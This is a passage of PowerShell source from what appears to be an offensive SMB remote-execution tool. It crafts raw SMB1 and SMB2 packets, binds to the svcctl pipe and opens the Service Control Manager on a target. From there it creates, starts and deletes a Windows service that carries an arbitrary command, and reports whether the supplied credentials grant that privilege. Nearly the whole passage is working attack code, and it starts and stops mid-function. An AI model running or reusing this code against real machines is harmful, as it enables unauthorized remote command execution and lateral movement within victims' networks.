                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                    }

                    'CreateAndXRequest'
                    {
                        $SMB_named_pipe_bytes = 0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00 # \svcctl
                        $SMB_tree_ID = $client_receive[28,29]
                        $packet_SMB_header = New-PacketSMBHeader 0xa2 0x18 0x02,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBNTCreateAndXRequest $SMB_named_pipe_bytes
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'RPCBind'
                    }
                  
                    'CreateServiceW'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID
                        
                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                             
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'ReadAndXRequest'
                        $stage_next = 'StartServiceW'
                    }

                    'CreateServiceW_First'
                    {
                        $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]
                        $packet_RPC_data = New-PacketRPCRequest 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first
                        $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length)
                        $SMB_split_index_tracker = $SMB_split_index
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data     
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($SMB_split_stage_final -le 2)
                        {
                            $stage = 'CreateServiceW_Last'
                        }
                        else
                        {
                            $SMB_split_stage = 2
                            $stage = 'CreateServiceW_Middle'
                        }

                    }

                    'CreateServiceW_Middle'
                    {
                        $SMB_split_stage++
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]
                        $SMB_split_index_tracker += $SMB_split_index
                        $packet_RPC_data = New-PacketRPCRequest 0x00 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle
                        $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length - $SMB_split_index_tracker + $SMB_split_index)
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data     
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($SMB_split_stage -ge $SMB_split_stage_final)
                        {
                            $stage = 'CreateServiceW_Last'
                        }
                        else
                        {
                            $stage = 'CreateServiceW_Middle'
                        }

                    }

                    'CreateServiceW_Last'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x48 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]
                        $packet_RPC_data = New-PacketRPCRequest 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'ReadAndXRequest'
                        $stage_next = 'StartServiceW'
                    }

                    'DeleteServiceW'
                    { 

                        if([System.BitConverter]::ToString($client_receive[88..91]) -eq '1d-04-00-00')
                        {
                            Write-Output "[+] Command executed with service $SMB_service on $Target"
                        }
                        elseif([System.BitConverter]::ToString($client_receive[88..91]) -eq '02-00-00-00')
                        {
                            Write-Output "[-] Service $SMB_service failed to start on $Target"
                        }

                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $packet_SCM_data = New-PacketSCMDeleteServiceW $SMB_service_context_handle
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'ReadAndXRequest'
                        $stage_next = 'CloseServiceHandle'
                        $SMB_close_service_handle_stage = 1
                    }

                    'Logoff'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x74 0x18 0x07,0xc8 0x34,0xfe $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBLogoffAndXRequest
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Exit'
                    }

                    'OpenSCManagerW'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $packet_SCM_data = New-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'ReadAndXRequest'
                        $stage_next = 'CheckAccess'           
                    }

                    'ReadAndXRequest'
                    {
                        Start-Sleep -m $Sleep
                        $packet_SMB_header = New-PacketSMBHeader 0x2e 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBReadAndXRequest $SMB_FID
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = $stage_next
                    }

                    'RPCBind'
                    {
                        $SMB_FID = $client_receive[42,43]
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_RPC_data = New-PacketRPCBind 0x48,0x00 1 0x01 0x00,0x00 $named_pipe_UUID 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'ReadAndXRequest'
                        $stage_next = 'OpenSCManagerW'
                    }
                
                    'StartServiceW'
                    {
                    
                        if([System.BitConverter]::ToString($client_receive[112..115]) -eq '00-00-00-00')
                        {
                            Write-Verbose "Service $SMB_service created on $Target"
                            $SMB_service_context_handle = $client_receive[92..111]
                            $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                            if($SMB_signing)
                            {
                                $packet_SMB_header["Flags2"] = 0x05,0x48
                                $SMB_signing_counter = $SMB_signing_counter + 2 
                                [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                                $packet_SMB_header["Signature"] = $SMB_signing_sequence
                            }

                            $packet_SCM_data = New-PacketSCMStartServiceW $SMB_service_context_handle
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                            $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                             
                            $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                                $SMB_signature = $MD5.ComputeHash($SMB_sign)
                                $SMB_signature = $SMB_signature[0..7]
                                $packet_SMB_header["Signature"] = $SMB_signature
                                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            Write-Verbose "[*] Trying to execute command on $Target"
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                            $stage = 'ReadAndXRequest'
                            $stage_next = 'DeleteServiceW'  
                        }
                        elseif([System.BitConverter]::ToString($client_receive[112..115]) -eq '31-04-00-00')
                        {
                            Write-Output "[-] Service $SMB_service creation failed on $Target"
                            $stage = 'Exit'
                        }
                        else
                        {
                            Write-Output "[-] Service creation fault context mismatch"
                            $stage = 'Exit'
                        }
    
                    }
                
                    'TreeConnectAndXRequest'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x75 0x18 0x01,0x48 0xff,0xff $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $MD5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBTreeConnectAndXRequest $SMB_path_bytes
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'CreateAndXRequest'
                    }

                    'TreeDisconnect'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x71 0x18 0x07,0xc8 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBTreeDisconnectRequest
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Logoff'
                    }

                }
            
            }

        }  
        else
        {
            
            $stage = 'TreeConnect'

            try
            {

                while ($stage -ne 'Exit')
                {

                    switch ($stage)
                    {
                
                        'CheckAccess'
                        {

                            if([System.BitConverter]::ToString($client_receive[128..131]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($client_receive[108..127]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                            {

                                $SMB_service_manager_context_handle = $client_receive[108..127]
                                
                                if($SMB_execute -eq $true)
                                {
                                    Write-Verbose "$output_username has Service Control Manager write privilege on $Target"
                                    $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                                    $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                                    if($SCM_data.Length -lt $SMB_split_index)
                                    {
                                        $stage = 'CreateServiceW'
                                    }
                                    else
                                    {
                                        $stage = 'CreateServiceW_First'
                                    }

                                }
                                else
                                {
                                    Write-Output "[+] $output_username has Service Control Manager write privilege on $Target"
                                    $SMB_close_service_handle_stage = 2
                                    $stage = 'CloseServiceHandle'
                                }

                            }
                            elseif([System.BitConverter]::ToString($client_receive[128..131]) -eq '05-00-00-00')
                            {
                                Write-Output "[-] $output_username does not have Service Control Manager write privilege on $Target"
                                $stage = 'Exit'
                            }
                            else
                            {
                                Write-Output "[-] Something went wrong with $Target"
                                $stage = 'Exit'
                            }

                        }

                        'CloseRequest'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }
        
                            $packet_SMB2_data = New-PacketSMB2CloseRequest $file_ID
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                            $stage = 'SendReceive'
                        }

                        'CloseServiceHandle'
                        {

                            if($SMB_close_service_handle_stage -eq 1)
                            {
                                Write-Verbose "Service $SMB_service deleted on $Target"
                                $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_context_handle
                            }
                            else
                            {
                                $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle
                            }

                            $SMB_close_service_handle_stage++
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
